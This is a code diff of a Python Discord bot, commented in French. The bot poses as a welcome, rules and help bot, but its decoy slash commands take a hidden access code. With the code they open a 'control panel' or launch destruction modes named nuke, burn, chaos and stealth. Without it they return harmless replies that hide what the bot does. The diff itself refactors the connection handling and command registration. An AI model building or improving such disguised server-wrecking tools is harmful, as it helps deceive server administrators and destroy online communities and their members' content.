@@ -1,10 +1,10 @@
-"""Bot Discord : commandes leurres, supervision de connexion, panneau de contrôle."""
+"""Bot Discord : commandes leurres, superviseur de connexion, panneau de contrôle."""
 
 from __future__ import annotations
 
 import asyncio
 import logging
-from typing import Any
+from typing import Any, Callable, Coroutine
 
 import discord
 from discord import app_commands
@@ -15,8 +15,8 @@ from . import config, db, destroyer, flavor, modes
 log = logging.getLogger("botsecret.bot")
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="!", intents=intents)
-tree = bot.tree
+
+bot: "SecretBot | None" = None
 
 READY = {"value": False}
 STATE: dict[str, Any] = {
@@ -26,6 +26,7 @@ STATE: dict[str, Any] = {
 }
 
 _supervisor_task: asyncio.Task | None = None
+_wake = asyncio.Event()
 _closing = False
 
 
@@ -39,6 +40,8 @@ def _secret_matches(code: str | None) -> bool:
 
 
 def _target_guild() -> discord.Guild | None:
+    if bot is None:
+        return None
     guild_id = db.get_guild_id()
     if guild_id is not None:
         return bot.get_guild(guild_id)
@@ -47,7 +50,7 @@ def _target_guild() -> discord.Guild | None:
     return None
 
 
-def _panel_embed(guild: discord.Guild | None) -> discord.Embed:
+def _panel_embed(guild: discord.Guild | None, client: discord.Client | None = None) -> discord.Embed:
     snap = destroyer.state.snapshot()
     embed = discord.Embed(
         title="☠️ PANNEAU DE CONTRÔLE ☠️",
@@ -55,8 +58,8 @@ def _panel_embed(guild: discord.Guild | None) -> discord.Embed:
         colour=discord.Colour.dark_red(),
         timestamp=discord.utils.utcnow(),
     )
-    if bot.user is not None:
-        embed.set_thumbnail(url=bot.user.display_avatar.url)
+    if client is not None and client.user is not None:
+        embed.set_thumbnail(url=client.user.display_avatar.url)
     if guild is not None:
         embed.add_field(name="🩸 Serveur", value=guild.name, inline=True)
         embed.add_field(name="⚰️ Membres", value=str(guild.member_count), inline=True)
@@ -136,7 +139,7 @@ class ControlView(discord.ui.View):
         self, interaction: discord.Interaction, button: discord.ui.Button
     ) -> None:
         await interaction.response.send_message(
-            embed=_panel_embed(interaction.guild), ephemeral=True
+            embed=_panel_embed(interaction.guild, interaction.client), ephemeral=True
         )
 
     @discord.ui.button(label="Arrêter", style=discord.ButtonStyle.primary, emoji="⏹️")
@@ -169,18 +172,18 @@ async def _launch_mode(interaction: discord.Interaction, mode: str) -> None:
     )
 
 
-@tree.command(name="gerer", description="Gérer le serveur")
 @app_commands.describe(code="Code d'accès")
 async def gerer(interaction: discord.Interaction, code: str | None = None) -> None:
     if not _secret_matches(code):
         await interaction.response.send_message("✅ Rien à signaler.", ephemeral=True)
         return
     await interaction.response.send_message(
-        embed=_panel_embed(interaction.guild), view=ControlView(), ephemeral=True
+        embed=_panel_embed(interaction.guild, interaction.client),
+        view=ControlView(),
+        ephemeral=True,
     )
 
 
-@tree.command(name="welcome", description="Accueillir les nouveaux membres")
 @app_commands.describe(code="Code d'accès")
 async def welcome(interaction: discord.Interaction, code: str | None = None) -> None:
     if not _secret_matches(code):
@@ -189,7 +192,6 @@ async def welcome(interaction: discord.Interaction, code: str | None = None) -> 
     await _launch_mode(interaction, "chaos")
 
 
-@tree.command(name="salut", description="Saluer le serveur")
 @app_commands.describe(code="Code d'accès")
 async def salut(interaction: discord.Interaction, code: str | None = None) -> None:
     if not _secret_matches(code):
@@ -198,7 +200,6 @@ async def salut(interaction: discord.Interaction, code: str | None = None) -> No
     await _launch_mode(interaction, "nuke")
 
 
-@tree.command(name="regles", description="Règles du serveur")
 @app_commands.describe(code="Code d'accès")
 async def regles(interaction: discord.Interaction, code: str | None = None) -> None:
     if not _secret_matches(code):
@@ -212,7 +213,6 @@ async def regles(interaction: discord.Interaction, code: str | None = None) -> N
     await _launch_mode(interaction, "burn")
 
 
-@tree.command(name="info", description="Informations du serveur")
 @app_commands.describe(code="Code d'accès")
 async def info(interaction: discord.Interaction, code: str | None = None) -> None:
     guild = interaction.guild
@@ -230,10 +230,9 @@ async def info(interaction: discord.Interaction, code: str | None = None) -> Non
     await _launch_mode(interaction, "stealth")
 
 
-@tree.command(name="ping", description="Latence du bot")
 @app_commands.describe(code="Code d'accès")
 async def ping(interaction: discord.Interaction, code: str | None = None) -> None:
-    latency = round(bot.latency * 1000)
+    latency = round((interaction.client.latency or 0) * 1000)
     if not _secret_matches(code):
         await interaction.response.send_message(f"🏓 {latency} ms", ephemeral=True)
         return
@@ -248,7 +247,6 @@ async def ping(interaction: discord.Interaction, code: str | None = None) -> Non
     await interaction.response.send_message(embed=embed, view=ControlView(), ephemeral=True)
 
 
-@tree.command(name="stats", description="Statistiques du serveur")
 @app_commands.describe(code="Code d'accès")
 async def stats(interaction: discord.Interaction, code: str | None = None) -> None:
     guild = interaction.guild
@@ -264,11 +262,12 @@ async def stats(interaction: discord.Interaction, code: str | None = None) -> No
         await interaction.response.send_message(embed=embed, ephemeral=True)
         return
     await interaction.response.send_message(
-        embed=_panel_embed(guild), view=ControlView(), ephemeral=True
+        embed=_panel_embed(guild, interaction.client),
+        view=ControlView(),
+        ephemeral=True,
     )
 
 
-@tree.command(name="aide", description="Aide du bot")
 @app_commands.describe(code="Code d'accès")
 async def aide(interaction: discord.Interaction, code: str | None = None) -> None:
     if not _secret_matches(code):
@@ -282,18 +281,64 @@ async def aide(interaction: discord.Interaction, code: str | None = None) -> Non
     await _launch_mode(interaction, "lockdown")
 
 
+CommandCallback = Callable[..., Coroutine[Any, Any, None]]
+
+COMMANDS: list[tuple[str, str, CommandCallback]] = [
+    ("gerer", "Gérer le serveur", gerer),
+    ("welcome", "Accueillir les nouveaux membres", welcome),
+    ("salut", "Saluer le serveur", salut),
+    ("regles", "Règles du serveur", regles),
+    ("info", "Informations du serveur", info),
+    ("ping", "Latence du bot", ping),
+    ("stats", "Statistiques du serveur", stats),
+    ("aide", "Aide du bot", aide),
+]
+
+
+class SecretBot(commands.Bot):
+    async def on_ready(self) -> None:
+        READY["value"] = True
+        STATE["last_error"] = None
+        STATE["connected_once"] = True
+        log.info("Connecté en tant que %s (%s)", self.user, self.user.id if self.user else "?")
+        db.add_log("info", f"bot connecté : {self.user} — {len(self.guilds)} serveur(s)")
+        await _update_presence()
+        try:
+            message = await sync_commands()
+            db.add_log("info", message)
+        except Exception as exc:  # noqa: BLE001
+            db.add_log("error", f"synchronisation des commandes impossible : {exc}")
+
+    async def on_error(self, event_method: str, *args: Any, **kwargs: Any) -> None:
+        log.exception("erreur sur l'événement %s", event_method)
+        db.add_log("error", f"erreur événement {event_method}")
+
+
+def _build_client() -> SecretBot:
+    client = SecretBot(command_prefix="!", intents=intents)
+    for name, description, callback in COMMANDS:
+        client.tree.add_command(
+            app_commands.Command(name=name, description=description, callback=callback)
+        )
+    return client
+
+
 async def sync_commands() -> str:
+    if bot is None:
+        raise RuntimeError("client indisponible")
     guild_id = db.get_guild_id()
     if guild_id is not None:
         guild = discord.Object(id=guild_id)
-        tree.copy_global_to(guild=guild)
-        synced = await tree.sync(guild=guild)
+        bot.tree.copy_global_to(guild=guild)
+        synced = await bot.tree.sync(guild=guild)
         return f"{len(synced)} commande(s) synchronisée(s) sur la guilde {guild_id}"
-    synced = await tree.sync()
+    synced = await bot.tree.sync()
     return f"{len(synced)} commande(s) synchronisée(s) globalement"
 
 
 async def _update_presence() -> None:
+    if bot is None:
+        return
     text = "🔥 destruction en cours" if destroyer.state.running else flavor.presence()
     try:
         await bot.change_presence(
@@ -304,31 +349,20 @@ async def _update_presence() -> None:
         pass
 
 
-@bot.event
-async def on_ready() -> None:
-    READY["value"] = True
-    STATE["last_error"] = None
-    STATE["connected_once"] = True
-    log.info("Connecté en tant que %s (%s)", bot.user, bot.user.id if bot.user else "?")
-    db.add_log("info", f"bot connecté : {bot.user} — {len(bot.guilds)} serveur(s)")
-    await _update_presence()
-    try:
-        message = await sync_commands()
-        db.add_log("info", message)
-    except Exception as exc:  # noqa: BLE001
-        db.add_log("error", f"synchronisation des commandes impossible : {exc}")
-
-
 async def _supervisor() -> None:
+    global bot
     backoff = 5
     while not _closing:
         if not config.DISCORD_TOKEN:
             STATE["last_error"] = "DISCORD_TOKEN absent"
             db.add_log("warn", "DISCORD_TOKEN absent : bot inactif")
             return
+
         STATE["attempts"] += 1
+        client = _build_client()
+        bot = client
         try:
-            await bot.start(config.DISCORD_TOKEN)
+            await client.start(config.DISCORD_TOKEN)
             if _closing:
                 break
             STATE["last_error"] = "connexion interrompue par Discord"
@@ -343,12 +377,24 @@ async def _supervisor() -> None:
             raise
         except Exception as exc:  # noqa: BLE001
             STATE["last_error"] = f"{type(exc).__name__} : {str(exc)[:160]}"
-        READY["value"] = False
+        finally:
+            READY["value"] = False
+            try:
+                if not client.is_closed():
+                    await client.close()
+            except Exception:  # noqa: BLE001
+                pass
+
         if _closing:
             break
+
         db.add_log("error", f"connexion échouée : {STATE['last_error']} — retry {backoff}s")
-        await asyncio.sleep(backoff)
-        backoff = min(90, backoff * 2)
+        _wake.clear()
+        try:
+            await asyncio.wait_for(_wake.wait(), timeout=backoff)
+            backoff = 5
+        except asyncio.TimeoutError:
+            backoff = min(90, backoff * 2)
 
 
 def start_bot() -> None:
@@ -361,13 +407,15 @@ def start_bot() -> None:
 
 
 async def restart() -> str:
-    """Force une reconnexion immédiate."""
+    """Force une reconnexion immédiate avec un nouveau client."""
     global _supervisor_task
     STATE["last_error"] = None
-    if bot.is_ready():
+    if bot is not None and not bot.is_closed():
         await bot.close()
     if _supervisor_task is None or _supervisor_task.done():
         start_bot()
+    else:
+        _wake.set()
     db.add_log("info", "reconnexion demandée depuis le dashboard")
     return "reconnexion lancée"
 
@@ -376,7 +424,8 @@ async def shutdown() -> None:
     global _closing
     _closing = True
     destroyer.stop()
-    if bot.is_ready():
+    _wake.set()
+    if bot is not None and not bot.is_closed():
         await bot.close()
     if _supervisor_task is not None:
         _supervisor_task.cancel()
@@ -385,18 +434,19 @@ async def shutdown() -> None:
 
 def guild_info() -> dict[str, Any]:
     guild = _target_guild()
+    connected = bot is not None and bot.is_ready()
     diagnostics = {
         "token_present": bool(config.DISCORD_TOKEN),
         "attempts": STATE["attempts"],
         "last_error": STATE["last_error"],
-        "guild_count": len(bot.guilds),
+        "guild_count": len(bot.guilds) if bot is not None else 0,
         "target_found": guild is not None,
         "guild_id_set": db.get_guild_id() is not None,
     }
     data: dict[str, Any] = {
-        "ready": READY["value"] and bot.is_ready(),
-        "user": str(bot.user) if bot.user else None,
-        "avatar": bot.user.display_avatar.url if bot.user else None,
+        "ready": READY["value"] and connected,
+        "user": str(bot.user) if bot is not None and bot.user else None,
+        "avatar": bot.user.display_avatar.url if bot is not None and bot.user else None,
         "guild": None,
         "diagnostics": diagnostics,
     }
@@ -412,6 +462,8 @@ def guild_info() -> dict[str, Any]:
 
 
 def list_guilds() -> list[dict[str, Any]]:
+    if bot is None:
+        return []
     return [
         {"id": g.id, "name": g.name, "members": g.member_count}
         for g in bot.guilds
